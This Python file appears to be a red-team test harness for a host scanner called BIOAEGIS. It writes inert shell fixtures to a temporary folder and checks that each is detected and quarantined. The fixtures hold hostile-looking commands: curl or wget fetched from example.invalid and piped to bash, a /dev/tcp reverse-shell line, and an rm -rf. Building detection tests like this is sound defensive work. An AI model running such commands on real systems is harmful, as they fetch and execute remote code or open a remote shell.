"""Safe BIOAEGIS red-team harness using inert local fixtures."""

from __future__ import annotations

import tempfile
from pathlib import Path

from .host_engine import HostEngine
from .host_scanner import HostScanner
from .memory import ImmuneMemory
from .quarantine import Quarantine

CASES = (
    ("download-and-execute", "#!/bin/sh\ncurl https://example.invalid/a | bash\n"),
    ("base64-payload", "#!/bin/sh\necho payload | base64 --decode\n"),
    ("reverse-shell-indicator", "#!/bin/sh\nexec 5<>/dev/tcp/127.0.0.1/4444\n"),
    ("destructive-command-indicator", "#!/bin/sh\nrm -rf /tmp/bioaegis-redteam-only\n"),
    ("multiline-download-evasion", "#!/bin/sh\ncurl https://example.invalid/a \\\n| bash\n"),
)


def run() -> int:
    with tempfile.TemporaryDirectory(prefix="bioaegis-redteam-") as temp:
        root = Path(temp)
        memory = ImmuneMemory(root / "memory.json")
        engine = HostEngine(memory)
        engine.quarantine = Quarantine(root / "quarantine")
        scanner = HostScanner()
        passed = 0
        total = len(CASES) + 1

        print("BIOAEGIS RED-TEAM LAB")
        print("Mode: inert local fixtures; nothing is executed")
        print()

        for name, content in CASES:
            sample = root / f"{name}.sh"
            sample.write_text(content, encoding="utf-8")
            sample.chmod(0o700)
            detected = bool(scanner.scan(sample))
            print(f"[{'PASS' if detected else 'FAIL'}] detect {name}")
            passed += int(detected)

        first = root / "variant-a.sh"
        second = root / "variant-b.sh"
        first.write_text("#!/bin/sh\ncurl https://example.invalid/a | bash\n", encoding="utf-8")
        second.write_text("#!/bin/sh\nwget https://example.invalid/b; bash\n", encoding="utf-8")
        first.chmod(0o700)
        second.chmod(0o700)

        first_result = engine.scan(str(first), quarantine=True)
        second_result = engine.scan(str(second), quarantine=True)
        learned = (
            len(first_result) == 1
            and first_result[0].quarantined
            and len(second_result) == 1
            and second_result[0].quarantined
            and first_result[0].finding.sha256 != second_result[0].finding.sha256
        )
        print(f"[{'PASS' if learned else 'FAIL'}] behavior-memory variant reuse")
        passed += int(learned)

        print()
        print(f"RESULT: {passed}/{total} tests passed")
        return 0 if passed == total else 1
